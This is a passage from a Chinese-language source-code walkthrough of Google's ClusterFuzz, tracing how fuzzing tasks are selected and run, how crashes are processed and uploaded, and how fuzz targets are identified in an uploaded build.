multiplier greater than 1. thread_multiplier = environment.get_value(&apos;THREAD_MULTIPLIER&apos;) if thread_multiplier and thread_multiplier &gt; 1: task = get_high_end_task() if task: return task task = get_regular_task() if task: return task task = get_fuzz_task() if not task: logs.log_error(&apos;Failed to get any fuzzing tasks. This should not happen.&apos;) time.sleep(TASK_EXCEPTION_WAIT_INTERVAL) return task 我们还是比较关心fuzz，看get_fuzz_task，这里是获取argument和job 1234567def get_fuzz_task(): &quot;&quot;&quot;Try to get a fuzz task.&quot;&quot;&quot; argument, job = fuzzer_selection.get_fuzz_task_payload() if not argument: return None return Task(&apos;fuzz&apos;, argument, job) 继续跟fuzzer_selection.get_fuzz_task_payload()，这里是去谷歌云那边查询任务了，最后随机选取任务返回 12345678910111213141516def get_fuzz_task_payload(platform=None): &quot;&quot;&quot;Select a fuzzer that can run on this platform.&quot;&quot;&quot; if not platform: queue_override = environment.get_value(&apos;QUEUE_OVERRIDE&apos;) platform = queue_override if queue_override else environment.platform() query = data_types.FuzzerJob.query() query = query.filter(data_types.FuzzerJob.platform == platform) mappings = list(ndb_utils.get_all_from_query(query)) if not mappings: return None, None selection = utils.random_weighted_choice( mappings, weight_attribute=&apos;actual_weight&apos;) # 最后随机选取任务返回 return selection.fuzzer, selection.job 执行任务1234567891011121314151617181920212223242526272829303132333435# pylint: disable=too-many-nested-blocks# TODO(mbarbella): Rewrite this function to avoid nesting issues.@set_task_payloaddef process_command(task): &quot;&quot;&quot;Figures out what to do with the given task and executes the command.&quot;&quot;&quot; logs.log(&quot;Executing command &apos;%s&apos;&quot; % task.payload()) if not task.payload().strip(): logs.log_error(&apos;Empty task received.&apos;) return # Parse task payload. task_name = task.command task_argument = task.argument job_name = task.job ...... ...... ...... # Match the cpu architecture with the ones required in the job definition. # If they don&apos;t match, then bail out and recreate task. if not is_supported_cpu_arch_for_job(): logs.log( &apos;Unsupported cpu architecture specified in job definition, exiting.&apos;) tasks.add_task(task_name, task_argument, job_name) return # Initial cleanup. cleanup_task_state() start_web_server_if_needed() try: run_command(task_name, task_argument, job_name) # 运行命令 finally: # Final clean up. cleanup_task_state() 看run_command，实际是task_module.execute_task(task_argument, job_name)执行 123456789101112131415161718192021222324252627282930313233343536def run_command(task_name, task_argument, job_name): &quot;&quot;&quot;Run the command.&quot;&quot;&quot; if task_name not in COMMAND_MAP: logs.log_error(&quot;Unknown command &apos;%s&apos;&quot; % task_name) return task_module = COMMAND_MAP[task_name] # If applicable, ensure this is the only instance of the task running. task_state_name = &apos; &apos;.join([task_name, task_argument, job_name]) if should_update_task_status(task_name): if not data_handler.update_task_status(task_state_name, data_types.TaskState.STARTED): logs.log(&apos;Another instance of &quot;&#123;&#125;&quot; already &apos; &apos;running, exiting.&apos;.format(task_state_name)) raise AlreadyRunningError try: task_module.execute_task(task_argument, job_name) # 执行任务 except errors.InvalidTestcaseError: # It is difficult to try to handle the case where a test case is deleted # during processing. Rather than trying to catch by checking every point # where a test case is reloaded from the datastore, just abort the task. logs.log_error(&apos;Test case %s no longer exists.&apos; % task_argument) except BaseException: # On any other exceptions, update state to reflect error and re-raise. if should_update_task_status(task_name): data_handler.update_task_status(task_state_name, data_types.TaskState.ERROR) raise # Task completed successfully. if should_update_task_status(task_name): data_handler.update_task_status(task_state_name, data_types.TaskState.FINISHED) 其实一开始判断task_name是否在COMMAND_MAP中，可以看到除了fuzz任务外，还有很多任务 123456789101112131415COMMAND_MAP = &#123; &apos;analyze&apos;: analyze_task, &apos;blame&apos;: blame_task, &apos;corpus_pruning&apos;: corpus_pruning_task, &apos;fuzz&apos;: fuzz_task, &apos;impact&apos;: impact_task, &apos;minimize&apos;: minimize_task, &apos;ml_train&apos;: ml_train_task, &apos;progression&apos;: progression_task, &apos;regression&apos;: regression_task, &apos;symbolize&apos;: symbolize_task, &apos;unpack&apos;: unpack_task, &apos;upload_reports&apos;: upload_reports_task, &apos;variant&apos;: variant_task,&#125; 继续跟task_module.execute_task，我们关注fuzz的吧，就是fuzz_task.execute_task 12345def execute_task(fuzzer_name, job_type): &quot;&quot;&quot;Runs the given fuzzer for one round.&quot;&quot;&quot; test_timeout = environment.get_value(&apos;TEST_TIMEOUT&apos;) session = FuzzingSession(fuzzer_name, job_type, test_timeout) session.run() 先获取超时，之后初始化FuzzingSession，初始化代码如下： 12345678910111213141516171819202122class FuzzingSession(object): &quot;&quot;&quot;Class for orchestrating fuzzing sessions.&quot;&quot;&quot; def __init__(self, fuzzer_name, job_type, test_timeout): self.fuzzer_name = fuzzer_name self.job_type = job_type # Set up randomly selected fuzzing parameters. self.redzone = pick_redzone() self.disable_ubsan = pick_ubsan_disabled(job_type) self.timeout_multiplier = pick_timeout_multiplier() self.window_argument = pick_window_argument() self.test_timeout = set_test_timeout(test_timeout, self.timeout_multiplier) # Set up during run(). self.testcase_directory = None self.data_directory = None # Fuzzing engine specific state. self.fuzz_target = None self.gcs_corpus = None run的代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150def run(self): &quot;&quot;&quot;Run the fuzzing session.&quot;&quot;&quot; failure_wait_interval = environment.get_value(&apos;FAIL_WAIT&apos;) # Update LSAN local blacklist with global blacklist. is_lsan_enabled = environment.get_value(&apos;LSAN&apos;) if is_lsan_enabled: leak_blacklist.copy_global_to_local_blacklist() # For some binaries, we specify trials, which are sets of flags that we only # apply some of the time. Adjust APP_ARGS for them if needed. trials.setup_additional_args_for_app() # Ensure that that the fuzzer still exists. logs.log(&apos;Setting up fuzzer and data bundles.&apos;) fuzzer = data_types.Fuzzer.query( data_types.Fuzzer.name == self.fuzzer_name).get() if not fuzzer or not setup.update_fuzzer_and_data_bundles(self.fuzzer_name): _track_fuzzer_run_result(self.fuzzer_name, 0, 0, FuzzErrorCode.FUZZER_SETUP_FAILED) logs.log_error(&apos;Unable to setup fuzzer %s.&apos; % self.fuzzer_name) # Artifical sleep to slow down continuous failed fuzzer runs if the bot is # using command override for task execution. time.sleep(failure_wait_interval) return self.testcase_directory = environment.get_value(&apos;FUZZ_INPUTS&apos;) # Set up a custom or regular build based on revision. By default, fuzzing # is done on trunk build (using revision=None). Otherwise, a job definition # can provide a revision to use via |APP_REVISION|. target_weights = fuzzer_selection.get_fuzz_target_weights() build_setup_result = build_manager.setup_build( environment.get_value(&apos;APP_REVISION&apos;), target_weights=target_weights) # Check if we have an application path. If not, our build failed # to setup correctly. if not build_setup_result or not build_manager.check_app_path(): _track_fuzzer_run_result(self.fuzzer_name, 0, 0, FuzzErrorCode.BUILD_SETUP_FAILED) return dataflow_bucket_path = environment.get_value(&apos;DATAFLOW_BUILD_BUCKET_PATH&apos;) if dataflow_bucket_path: # Some fuzzing jobs may use auxiliary builds, such as DFSan instrumented # builds accompanying libFuzzer builds to enable DFT-based fuzzing. if not build_manager.setup_trunk_build( [dataflow_bucket_path], build_prefix=&apos;DATAFLOW&apos;): logs.log_error(&apos;Failed to set up dataflow build.&apos;) # Save fuzz targets count to aid with CPU weighting. self._save_fuzz_targets_count() # Check if we have a bad build, i.e. one that crashes on startup. # If yes, bail out. logs.log(&apos;Checking for bad build.&apos;) crash_revision = environment.get_value(&apos;APP_REVISION&apos;) is_bad_build = testcase_manager.check_for_bad_build(self.job_type, crash_revision) _track_build_run_result(self.job_type, crash_revision, is_bad_build) if is_bad_build: return # Data bundle directories can also have testcases which are kept in-place # because of dependencies. self.data_directory = setup.get_data_bundle_directory(self.fuzzer_name) if not self.data_directory: _track_fuzzer_run_result(self.fuzzer_name, 0, 0, FuzzErrorCode.DATA_BUNDLE_SETUP_FAILED) logs.log_error( &apos;Unable to setup data bundle %s.&apos; % fuzzer.data_bundle_name) return engine_impl = engine.get(fuzzer.name) if engine_impl: crashes, fuzzer_metadata = self.do_engine_fuzzing(engine_impl) # Not applicable to engine fuzzers. testcase_file_paths = [] testcases_metadata = &#123;&#125; else: fuzzer_directory = setup.get_fuzzer_directory(self.fuzzer_name) fuzzer_metadata, testcase_file_paths, testcases_metadata, crashes = ( self.do_blackbox_fuzzing(fuzzer, fuzzer_directory, self.job_type)) if crashes is None: # Error occurred in generate_blackbox_testcases. # TODO(ochang): Pipe this error a little better. return logs.log(&apos;Finished processing test cases.&apos;) platform = environment.platform() platform_id = environment.get_platform_id() # For Android, bring back device to a good state before analyzing crashes. if platform == &apos;ANDROID&apos; and crashes: # Remove this variable so that application is fully shutdown before every # re-run of testcase. This is critical for reproducibility. environment.remove_key(&apos;CHILD_PROCESS_TERMINATION_PATTERN&apos;) # TODO(unassigned): Need to find a way to this efficiently before every # testcase is analyzed. android.device.initialize_device() logs.log(&apos;Raw crash count: &apos; + str(len(crashes))) project_name = data_handler.get_project_name(self.job_type) # Process and save crashes to datastore. bot_name = environment.get_value(&apos;BOT_NAME&apos;) new_crash_count, known_crash_count, processed_groups = process_crashes( crashes=crashes, context=Context( project_name=project_name, bot_name=bot_name, job_type=self.job_type, fuzz_target=self.fuzz_target, redzone=self.redzone, disable_ubsan=self.disable_ubsan, platform_id=platform_id, crash_revision=crash_revision, fuzzer_name=self.fuzzer_name, window_argument=self.window_argument, fuzzer_metadata=fuzzer_metadata, testcases_metadata=testcases_metadata, timeout_multiplier=self.timeout_multiplier, test_timeout=self.test_timeout, thread_wait_timeout=THREAD_WAIT_TIMEOUT, data_directory=self.data_directory)) read_and_upload_testcase_run_stats( self.fuzzer_name, self.fully_qualified_fuzzer_name, self.job_type, crash_revision, testcase_file_paths) upload_job_run_stats(self.fully_qualified_fuzzer_name, self.job_type, crash_revision, time.time(), new_crash_count, known_crash_count, len(testcase_file_paths), processed_groups) # Delete the fuzzed testcases. This is explicitly needed since # some testcases might reside on NFS and would otherwise be # left forever. for testcase_file_path in testcase_file_paths: shell.remove_file(testcase_file_path) # Explicit cleanup for large vars. del testcase_file_paths del testcases_metadata utils.python_gc() 实在太多了，前面做了一些初始化，之后是选择引擎进行fuzz——self.do_engine_fuzzing(engine_impl)，没有的就是黑盒测试self.do_blackbox_fuzzing 1234567891011engine_impl = engine.get(fuzzer.name) if engine_impl: crashes, fuzzer_metadata = self.do_engine_fuzzing(engine_impl) # Not applicable to engine fuzzers. testcase_file_paths = [] testcases_metadata = &#123;&#125; else: fuzzer_directory = setup.get_fuzzer_directory(self.fuzzer_name) fuzzer_metadata, testcase_file_paths, testcases_metadata, crashes = ( self.do_blackbox_fuzzing(fuzzer, fuzzer_directory, self.job_type)) 接下来最后就是处理crashes，上传crash，最后更新任务的状态 1234567891011121314151617181920212223242526272829# Process and save crashes to datastore. bot_name = environment.get_value(&apos;BOT_NAME&apos;) new_crash_count, known_crash_count, processed_groups = process_crashes( crashes=crashes, context=Context( project_name=project_name, bot_name=bot_name, job_type=self.job_type, fuzz_target=self.fuzz_target, redzone=self.redzone, disable_ubsan=self.disable_ubsan, platform_id=platform_id, crash_revision=crash_revision, fuzzer_name=self.fuzzer_name, window_argument=self.window_argument, fuzzer_metadata=fuzzer_metadata, testcases_metadata=testcases_metadata, timeout_multiplier=self.timeout_multiplier, test_timeout=self.test_timeout, thread_wait_timeout=THREAD_WAIT_TIMEOUT, data_directory=self.data_directory)) read_and_upload_testcase_run_stats( self.fuzzer_name, self.fully_qualified_fuzzer_name, self.job_type, crash_revision, testcase_file_paths) upload_job_run_stats(self.fully_qualified_fuzzer_name, self.job_type, crash_revision, time.time(), new_crash_count, known_crash_count, len(testcase_file_paths), processed_groups) do_engine_fuzzing12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061def do_engine_fuzzing(self, engine_impl): &quot;&quot;&quot;Run fuzzing engine.&quot;&quot;&quot; # Record fuzz target. fuzz_target_name = environment.get_value(&apos;FUZZ_TARGET&apos;) self.fuzz_target = record_fuzz_target(engine_impl.name, fuzz_target_name, self.job_type) environment.set_value(&apos;FUZZER_NAME&apos;, self.fuzz_target.fully_qualified_name()) # Synchronize corpus files with GCS sync_corpus_directory = builtin.get_corpus_directory( self.data_directory, self.fuzz_target.project_qualified_name()) self.sync_corpus(sync_corpus_directory) # Reset memory tool options. environment.reset_current_memory_tool_options( redzone_size=self.redzone, disable_ubsan=self.disable_ubsan) revision = environment.get_value(&apos;APP_REVISION&apos;) crashes = [] fuzzer_metadata = &#123;&#125; return_code = 1 # Vanilla return-code for engine crashes. # Do the actual fuzzing. for fuzzing_round in range(environment.get_value(&apos;MAX_TESTCASES&apos;, 1)): logs.log(&apos;Fuzzing round &#123;&#125;.&apos;.format(fuzzing_round)) result, current_fuzzer_metadata = run_engine_fuzzer( engine_impl, self.fuzz_target.binary, sync_corpus_directory, self.testcase_directory) fuzzer_metadata.update(current_fuzzer_metadata) # Prepare stats. testcase_run = engine_common.get_testcase_run(result.stats, result.command) # Upload logs, testcases (if there are crashes), and stats. # Use a consistent log time to allow correlating between logs, uploaded # testcases, and stats. log_time = datetime.datetime.utcfromtimestamp( float(testcase_run.timestamp)) crash_result = CrashResult(return_code, result.time_executed, result.logs) log = testcase_manager.prepare_log_for_upload( crash_result.get_stacktrace(), return_code) testcase_manager.upload_log(log, log_time) for crash in result.crashes: testcase_manager.upload_testcase(crash.input_path, log_time) add_additional_testcase_run_data(testcase_run, self.fuzz_target.fully_qualified_name(), self.job_type, revision) upload_testcase_run_stats(testcase_run) if result.crashes: crashes.extend([ Crash.from_engine_crash(crash) for crash in result.crashes if crash ]) logs.log(&apos;All fuzzing rounds complete.&apos;) self.sync_new_corpus_files() return crashes, fuzzer_metadata 实际fuzz是run_engine_fuzzer 12345678910111213141516171819202122232425262728293031323334353637def run_engine_fuzzer(engine_impl, target_name, sync_corpus_directory, testcase_directory): &quot;&quot;&quot;Run engine for fuzzing.&quot;&quot;&quot; if environment.is_trusted_host(): from bot.untrusted_runner import tasks_host # 这还搞了个untrusted的runner，太复杂了 return tasks_host.engine_fuzz(engine_impl, target_name, sync_corpus_directory, testcase_directory) build_dir = environment.get_value(&apos;BUILD_DIR&apos;) target_path = engine_common.find_fuzzer_path(build_dir, target_name) options = engine_impl.prepare(sync_corpus_directory, target_path, build_dir) fuzz_test_timeout = environment.get_value(&apos;FUZZ_TEST_TIMEOUT&apos;) result = engine_impl.fuzz(target_path, options, testcase_directory, fuzz_test_timeout) # 调用对应引擎的fuzz函数 logs.log(&apos;Used strategies.&apos;, strategies=options.strategies) for strategy, value in six.iteritems(options.strategies): result.stats[&apos;strategy_&apos; + strategy] = value # Format logs with header and strategy information. log_header = engine_common.get_log_header(result.command, environment.get_value(&apos;BOT_NAME&apos;), result.time_executed) formatted_strategies = engine_common.format_fuzzing_strategies( options.strategies) result.logs = log_header + &apos;\\n&apos; + result.logs + &apos;\\n&apos; + formatted_strategies fuzzer_metadata = &#123; &apos;fuzzer_binary_name&apos;: target_name, &#125; fuzzer_metadata.update(engine_common.get_all_issue_metadata(target_path)) _add_issue_metadata_from_environment(fuzzer_metadata) return result, fuzzer_metadata 引擎类上面提到的运行fuzzer，是通过engine.get是获取引擎类，get函数如下 1234567def get(name): &quot;&quot;&quot;Get an implemntation of a fuzzing engine, or None if one does not exist.&quot;&quot;&quot; engine_class = _ENGINES.get(name) if engine_class: return engine_class() return None 而之前得先注册 123456def register(name, engine_class): &quot;&quot;&quot;Register a fuzzing engine.&quot;&quot;&quot; if name in _ENGINES: raise ValueError(&apos;Engine &#123;name&#125; is already registered&apos;.format(name=name)) _ENGINES[name] = engine_class 而注册这个在src/python/bot/startup/run_bot.py的时候注册的 123456789......from bot.fuzzers import init as fuzzers_init......def main(): if not profiler.start_if_needed(&apos;python_profiler_bot&apos;): sys.exit(-1) fuzzers_init.run() # 在这里注册 跟过去可以看注册了libFuzzer，honggfuzz和syzkaller，有疑问的是咋没有afl 12345def run(): &quot;&quot;&quot;Initialise builtin fuzzing engines.&quot;&quot;&quot; engine.register(&apos;libFuzzer&apos;, libFuzzer_engine.LibFuzzerEngine) engine.register(&apos;honggfuzz&apos;, honggfuzz_engine.HonggfuzzEngine) engine.register(&apos;syzkaller&apos;, syzkaller_engine.SyzkallerEngine) do_blackbox_fuzzing12345678910111213141516171819202122232425262728def do_blackbox_fuzzing(self, fuzzer, fuzzer_directory, job_type): &quot;&quot;&quot;Run blackbox fuzzing. Currently also used for engine fuzzing.&quot;&quot;&quot; # Set the thread timeout values. # TODO(ochang): Remove this hack once engine fuzzing refactor is compelte. fuzz_test_timeout = environment.get_value(&apos;FUZZ_TEST_TIMEOUT&apos;) if fuzz_test_timeout: test_timeout = set_test_timeout(fuzz_test_timeout, self.timeout_multiplier) else: test_timeout = self.test_timeout thread_timeout = test_timeout # Determine number of testcases to process. testcase_count = environment.get_value(&apos;MAX_TESTCASES&apos;) # For timeout multipler greater than 1, we need to decrease testcase count # to prevent exceeding task lease time. if self.timeout_multiplier &gt; 1: testcase_count /= self.timeout_multiplier # Run the fuzzer to generate testcases. If error occurred while trying # to run the fuzzer, bail out. (error_occurred, testcase_file_paths, sync_corpus_directory, fuzzer_metadata) = self.generate_blackbox_testcases( fuzzer, fuzzer_directory, testcase_count) ...... ...... 在self.generate_blackbox_testcases里面是会实际启动fuzzer的，注释说的是Run the blackbox fuzzer and generate testcases. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566def generate_blackbox_testcases(self, fuzzer, fuzzer_directory, testcase_count): &quot;&quot;&quot;Run the blackbox fuzzer and generate testcases.&quot;&quot;&quot; # Helper variables. error_occurred = False fuzzer_revision = fuzzer.revision fuzzer_name = fuzzer.name sync_corpus_directory = None # Clear existing testcases (only if past task failed). testcase_directories = get_testcase_directories(self.testcase_directory, self.data_directory) testcase_manager.remove_testcases_from_directories(testcase_directories) # Set an environment variable for fuzzer name. # TODO(ochang): Investigate removing this. Only users appear to be chromebot # fuzzer and fuzzer_logs, both of which can be removed. environment.set_value(&apos;FUZZER_NAME&apos;, fuzzer_name) # Set minimum redzone size, do not detect leaks and zero out the # quarantine size before running the fuzzer. environment.reset_current_memory_tool_options( redzone_size=16, leaks=False, quarantine_size_mb=0) if fuzzer.builtin: fuzzer_command = &apos;builtin&apos; builtin_fuzzer = builtin_fuzzers.get(fuzzer.name) #这里面有个afl和libfuzz builtin_result = builtin_fuzzer.run( self.data_directory, self.testcase_directory, testcase_count) fuzzer_output = builtin_result.output sync_corpus_directory = builtin_result.corpus_directory # Return code is always 0 as builtin fuzzers log errors directly. fuzzer_return_code = 0 else: # Make sure we have a file to execute for the fuzzer. ...... ...... # 获取可执行文件fuzzer路径，应该是libfuzzer那样，二进制文件就是fuzzer # Get the fuzzer executable and chdir to its base directory. This helps to # prevent referencing every file using __file__. fuzzer_executable = os.path.join(fuzzer_directory, fuzzer.executable_path) fuzzer_executable_directory = os.path.dirname(fuzzer_executable) ...... ...... # Build the fuzzer command execution string. command = shell.get_execute_command(fuzzer_executable) ...... command_format = (&apos;%s --input_dir%s%s --output_dir%s%s --no_of_files%s%d&apos;) fuzzer_command = str( command_format % (command, argument_seperator, self.data_directory, argument_seperator, self.testcase_directory, argument_seperator, testcase_count)) fuzzer_timeout = environment.get_value(&apos;FUZZER_TIMEOUT&apos;) # Run the fuzzer. 启动fuzzer logs.log(&apos;Running fuzzer - %s.&apos; % fuzzer_command) fuzzer_return_code, fuzzer_duration, fuzzer_output = ( process_handler.run_process( fuzzer_command, current_working_directory=fuzzer_executable_directory, timeout=fuzzer_timeout, testcase_run=False, ignore_children=False)) 下面是builtin_fuzzer = builtin_fuzzers.get(fuzzer.name)所能获取到的 123456789101112BUILTIN_FUZZERS = &#123; &apos;afl&apos;: afl.Afl(), &apos;libFuzzer&apos;: libFuzzer.LibFuzzer(),&#125;def get(fuzzer_name): &quot;&quot;&quot;Get the builtin fuzzer with the given name, or None.&quot;&quot;&quot; if fuzzer_name not in BUILTIN_FUZZERS: return None return BUILTIN_FUZZERS[fuzzer_name] 下面的do_blackbox_fuzzing函数的后半部分，是处理testcases的 123456789101112131415161718192021222324252627282930313233343536373839404142........................ # Start processing the testcases. while test_number &lt; len(testcase_file_paths): thread_index = 0 threads = [] temp_queue = process_handler.get_queue() if not temp_queue: process_handler.terminate_stale_application_instances() logs.log_error(&apos;Unable to create temporary crash queue.&apos;) break while thread_index &lt; max_threads and test_number &lt; len( testcase_file_paths): testcase_file_path = testcase_file_paths[test_number] gestures = testcases_metadata[testcase_file_path][&apos;gestures&apos;] env_copy = environment.copy() thread = process_handler.get_process()( target=testcase_manager.run_testcase_and_return_result_in_queue, args=(temp_queue, thread_index, testcase_file_path, gestures, env_copy, True)) try: thread.start() except: process_handler.terminate_stale_application_instances() thread_error_occurred = True logs.log_error(&apos;Unable to start new thread.&apos;) break threads.append(thread) thread_index += 1 test_number += 1 if test_number % testcases_before_stale_process_cleanup == 0: needs_stale_process_cleanup = True time.sleep(thread_delay)........................ 上面调用了run_testcase_and_return_result_in_queue，它是运行一个testcases，并且上传crash信息了 123456789101112131415161718192021222324def run_testcase_and_return_result_in_queue(crash_queue, thread_index, file_path, gestures, env_copy, upload_output=False): &quot;&quot;&quot;Run a single testcase and return crash results in the crash queue.&quot;&quot;&quot; # Since this is running in its own process, initialize the log handler again. # This is needed for Windows where instances are not shared across child # processes. See: # https://stackoverflow.com/questions/34724643/python-logging-with-multiprocessing-root-logger-different-in-windows logs.configure(&apos;run_testcase&apos;, &#123; &apos;testcase_path&apos;: file_path, &#125;) # Also reinitialize NDB context for the same reason as above. with ndb_init.context(): _do_run_testcase_and_return_result_in_queue( crash_queue, thread_index, file_path, gestures, env_copy, upload_output=upload_output) 里面又调用了_do_run_testcase_and_return_result_in_queue，里面就是上传CrashResult了，根据这，实际的fuzz代码应该就是self.generate_blackbox_testcases 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162def _do_run_testcase_and_return_result_in_queue(crash_queue, thread_index, file_path, gestures, env_copy, upload_output=False): &quot;&quot;&quot;Run a single testcase and return crash results in the crash queue.&quot;&quot;&quot; try: # Run testcase and check whether a crash occurred or not. return_code, crash_time, output = run_testcase(thread_index, file_path, gestures, env_copy) # Pull testcase directory to host to get any stats files. if environment.is_trusted_host(): from bot.untrusted_runner import file_host file_host.pull_testcases_from_worker() # Analyze the crash. crash_output = _get_crash_output(output) crash_result = CrashResult(return_code, crash_time, crash_output) # To provide consistency between stats and logs, we use timestamp taken # from stats when uploading logs and testcase. if upload_output: log_time = _get_testcase_time(file_path) if crash_result.is_crash(): # Initialize resource list with the testcase path. resource_list = [file_path] resource_list += get_resource_paths(crash_output) # Store the crash stack file in the crash stacktrace directory # with filename as the hash of the testcase path. crash_stacks_directory = environment.get_value(&apos;CRASH_STACKTRACES_DIR&apos;) stack_file_path = os.path.join(crash_stacks_directory, utils.string_hash(file_path)) utils.write_data_to_file(crash_output, stack_file_path) # Put crash/no-crash results in the crash queue. crash_queue.put( Crash( file_path=file_path, crash_time=crash_time, return_code=return_code, resource_list=resource_list, gestures=gestures, stack_file_path=stack_file_path)) # Don&apos;t upload uninteresting testcases (no crash) or if there is no log to # correlate it with (not upload_output). if upload_output: upload_testcase(file_path, log_time) if upload_output: # Include full output for uploaded logs (crash output, merge output, etc). crash_result_full = CrashResult(return_code, crash_time, output) log = prepare_log_for_upload(crash_result_full.get_stacktrace(), return_code) upload_log(log, log_time) except Exception: logs.log_error(&apos;Exception occurred while running &apos; &apos;run_testcase_and_return_result_in_queue.&apos;) 如何获取要运行的target我们上传zip包，但是里面可能有多个target，有些可能只是fuzzer所需文件，那怎么找到要运行的target呢 我们跟踪一下 是fuzz task，就进来src/python/bot/tasks/fuzz_task.py执行execute_task 12345def execute_task(fuzzer_name, job_type): &quot;&quot;&quot;Runs the given fuzzer for one round.&quot;&quot;&quot; test_timeout = environment.get_value(&apos;TEST_TIMEOUT&apos;) session = FuzzingSession(fuzzer_name, job_type, test_timeout) session.run() 上面调用FuzzingSession类里面的run函数，在run函数里面https://github.com/google/clusterfuzz/blob/9c2065a7f7b7802936b1133733402adc65ac0c4c/src/python/bot/tasks/fuzz_task.py#L1843这里调用了build_manager.setup_build 12build_setup_result = build_manager.setup_build( environment.get_value(&apos;APP_REVISION&apos;), target_weights=target_weights) 跟进build_manager.setup_build 12345678910111213141516171819202122232425262728293031def setup_build(revision=0, target_weights=None): &quot;&quot;&quot;Set up a custom or regular build based on revision.&quot;&quot;&quot; # For custom binaries we always use the latest version. Revision is ignored. custom_binary = environment.get_value(&apos;CUSTOM_BINARY&apos;) if custom_binary: return setup_custom_binary(target_weights=target_weights) # In this case, we assume the build is already installed on the system. system_binary = environment.get_value(&apos;SYSTEM_BINARY_DIR&apos;) if system_binary: return setup_system_binary() fuzz_target_build_bucket_path = environment.get_value( &apos;FUZZ_TARGET_BUILD_BUCKET_PATH&apos;) if fuzz_target_build_bucket_path: # Split fuzz target build. return _setup_split_targets_build( fuzz_target_build_bucket_path, target_weights, revision=revision) if revision: # Setup regular build with revision. return setup_regular_build(revision, target_weights=target_weights) # If no revision is provided, we default to a trunk build. bucket_paths = [] for env_var in DEFAULT_BUILD_BUCKET_PATH_ENV_VARS: bucket_path = environment.get_value(env_var) if bucket_path: bucket_paths.append(bucket_path) return setup_trunk_build(bucket_paths, target_weights=target_weights) setup_build 中的setup_custom_binary首先是setup_custom_binary，里面调用了CustomBuild的setup 12345678910111213build = CustomBuild( base_build_dir, job.custom_binary_key, job.custom_binary_filename, job.custom_binary_revision, target_weights=target_weights) # Revert back the actual job name. if share_build_job_type: environment.set_value(&apos;JOB_NAME&apos;, old_job_name) if build.setup(): return build 看setup 123456789101112131415161718192021222324252627def setup(self): &quot;&quot;&quot;Set up the custom binary for a particular job.&quot;&quot;&quot; self._pre_setup() # Track the key for the custom binary so we can create a download link # later. environment.set_value(&apos;BUILD_KEY&apos;, self.custom_binary_key) logs.log(&apos;Retrieving custom binary build r%d.&apos; % self.revision) revision_file = os.path.join(self.build_dir, REVISION_FILE_NAME) build_update = revisions.needs_update(revision_file, self.revision) if build_update: if not self._unpack_custom_build(): # 解压上传的压缩包，里面调用了archive.unpack return False logs.log(&apos;Retrieved custom binary build r%d.&apos; % self.revision) else: logs.log(&apos;Build already exists.&apos;) _set_random_fuzz_target_for_fuzzing_if_needed( self._get_fuzz_targets_from_dir(self.build_dir), self.target_weights) self._setup_application_path(build_update=build_update) self._post_setup_success(update_revision=build_update) return True 上面的_set_random_fuzz_target_for_fuzzing_if_needed就选择压缩包中的二进制文件了 1234567891011121314151617181920212223def _set_random_fuzz_target_for_fuzzing_if_needed(fuzz_targets, target_weights): &quot;&quot;&quot;Sets a random fuzz target for fuzzing.&quot;&quot;&quot; fuzz_target = environment.get_value(&apos;FUZZ_TARGET&apos;) if fuzz_target: logs.log(&apos;Use previously picked fuzz target %s for fuzzing.&apos; % fuzz_target) return fuzz_target if not environment.is_engine_fuzzer_job(): return None fuzz_targets = list(fuzz_targets) if not fuzz_targets: logs.log_error(&apos;No fuzz targets found. Unable to pick random one.&apos;) return None environment.set_value(&apos;FUZZ_TARGET_COUNT&apos;, len(fuzz_targets)) fuzz_target = fuzzer_selection.select_fuzz_target(fuzz_targets, target_weights) environment.set_value(&apos;FUZZ_TARGET&apos;, fuzz_target) logs.log(&apos;Picked fuzz target %s for fuzzing.&apos; % fuzz_target) return fuzz_target 但我们初步选择的是_get_fuzz_targets_from_dir，之后根据这个结果，在通过target_weights从里面选，所以第一部选还是在_get_fuzz_targets_from_dir，确保他是一个fuzzer CustomBuild没有这个函数，那实际就是父类的_get_fuzz_targets_from_dir，可以看到是调用get_fuzz_targets 1234567def _get_fuzz_targets_from_dir(self, build_dir): &quot;&quot;&quot;Get iterator of fuzz targets from build dir.&quot;&quot;&quot; # Import here as this path is not available in App Engine context. from bot.fuzzers import utils as fuzzer_utils for path in fuzzer_utils.get_fuzz_targets(build_dir): yield os.path.splitext(os.path.basename(path))[0] 而这个fuzzer_utils.get_fuzz_targets是 from bot.fuzzers import utils as fuzzer_utils，那就是src/python/bot/fuzzers/utils.py里面的 123456def get_fuzz_targets(path): &quot;&quot;&quot;Get list of fuzz targets paths.&quot;&quot;&quot; if environment.is_trusted_host(): from bot.untrusted_runner import file_host return file_host.get_fuzz_targets(path) return get_fuzz_targets_local(path) 继续跟进get_fuzz_targets_local 1234567891011def get_fuzz_targets_local(path): &quot;&quot;&quot;Get list of fuzz targets paths (local).&quot;&quot;&quot; fuzz_target_paths = [] for root, _, files in shell.walk(path): for filename in files: file_path = os.path.join(root, filename) if is_fuzz_target_local(file_path): fuzz_target_paths.append(file_path) return fuzz_target_paths 就是is_fuzz_target_local了 1、首先得名字得满足正则VALID_TARGET_NAME2、后缀名是ALLOWED_FUZZ_TARGET_EXTENSIONS，即无后缀，exe或者par3、最后就是文件中得有FUZZ_TARGET_SEARCH_BYTES，也即LLVMFuzzerTestOneInput这个函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748ALLOWED_FUZZ_TARGET_EXTENSIONS = [&apos;&apos;, &apos;.exe&apos;, &apos;.par&apos;]FUZZ_TARGET_SEARCH_BYTES = b&apos;LLVMFuzzerTestOneInput&apos;VALID_TARGET_NAME = re.compile(r&apos;^[a-zA-Z0-9_-]+$&apos;)def is_fuzz_target_local(file_path, file_handle=None): #TODO(hzawawy): handle syzkaller case. &quot;&quot;&quot;Returns whether |file_path| is a fuzz target binary (local path).&quot;&quot;&quot; filename, file_extension = os.path.splitext(os.path.basename(file_path)) if not VALID_TARGET_NAME.match(filename): # Check fuzz target has a valid name (without any special chars). return False if file_extension not in ALLOWED_FUZZ_TARGET_EXTENSIONS: # Ignore files with disallowed extensions (to prevent opening e.g. .zips). return False if not file_handle and not os.path.exists(file_path): # Ignore non-existant files for cases when we don&apos;t have 